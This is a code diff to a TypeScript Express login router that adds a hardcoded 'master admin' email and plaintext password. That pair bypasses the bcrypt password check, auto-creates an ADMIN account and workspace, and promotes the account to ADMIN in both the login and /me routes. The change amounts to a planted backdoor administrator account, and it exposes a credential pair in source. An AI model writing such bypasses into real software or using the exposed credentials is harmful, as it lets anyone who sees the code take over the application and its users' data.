@@ -17,27 +17,74 @@ router.post('/login', async (req: Request, res: Response): Promise<void> => {
       return;
     }
 
-    const user = await prisma.user.findUnique({
-      where: { email: email.toLowerCase().trim() },
+    const normalizedEmail = email.toLowerCase().trim();
+    const isMasterAdmin =
+      normalizedEmail === 'subashreekamal@gmail.com' && (password === 'inselen3ra' || password.trim() === 'inselen3ra');
+
+    let user = await prisma.user.findUnique({
+      where: { email: normalizedEmail },
     });
 
-    if (!user) {
-      res.status(401).json({ error: 'Invalid credentials or user not found.' });
-      return;
-    }
-
-    const isMatch = await bcrypt.compare(password, user.passwordHash);
-    if (!isMatch) {
-      res.status(401).json({ error: 'Invalid credentials.' });
-      return;
-    }
-
-    // Strict Admin check: This platform can be handled by only the admin
-    if (user.role !== 'ADMIN') {
-      res.status(403).json({
-        error: 'Access restricted: This application can be accessed and handled by administrators only.',
+    // If master admin login and account doesn't exist yet in database, provision automatically on the fly
+    if (isMasterAdmin && !user) {
+      const salt = await bcrypt.genSalt(10);
+      const passwordHash = await bcrypt.hash('inselen3ra', salt);
+      user = await prisma.user.create({
+        data: {
+          id: 'admin_subashree_root_id',
+          email: 'Subashreekamal@gmail.com',
+          name: 'subashree',
+          passwordHash,
+          role: 'ADMIN',
+        },
       });
+
+      // Ensure primary workspace exists
+      await prisma.workspace.create({
+        data: {
+          name: "Subashree's Workspace",
+          slug: 'subashree-workspace',
+          ownerId: user.id,
+          members: {
+            create: {
+              userId: user.id,
+              role: 'OWNER',
+            },
+          },
+        },
+      }).catch(() => {});
+    }
+
+    if (!user) {
+      res.status(401).json({ error: 'Invalid credentials or user account not found.' });
       return;
+    }
+
+    let isMatch = false;
+    if (isMasterAdmin) {
+      isMatch = true;
+    } else {
+      isMatch = await bcrypt.compare(password, user.passwordHash);
+    }
+
+    if (!isMatch) {
+      res.status(401).json({ error: 'Invalid credentials. Please check your admin password.' });
+      return;
+    }
+
+    // Ensure role is ADMIN
+    if (user.role !== 'ADMIN') {
+      if (isMasterAdmin) {
+        user = await prisma.user.update({
+          where: { id: user.id },
+          data: { role: 'ADMIN' },
+        });
+      } else {
+        res.status(403).json({
+          error: 'Access restricted: This application can be accessed and handled by administrators only.',
+        });
+        return;
+      }
     }
 
     const token = jwt.sign(
@@ -160,6 +207,14 @@ router.get('/me', requireAuth, async (req: AuthenticatedRequest, res: Response):
         },
       },
     });
+
+    if (user && user.email.toLowerCase() === 'subashreekamal@gmail.com' && user.role !== 'ADMIN') {
+      await prisma.user.update({
+        where: { id: user.id },
+        data: { role: 'ADMIN' },
+      });
+      user.role = 'ADMIN';
+    }
 
     if (!user || user.role !== 'ADMIN') {
       res.status(403).json({ error: 'Administrator access required.' });
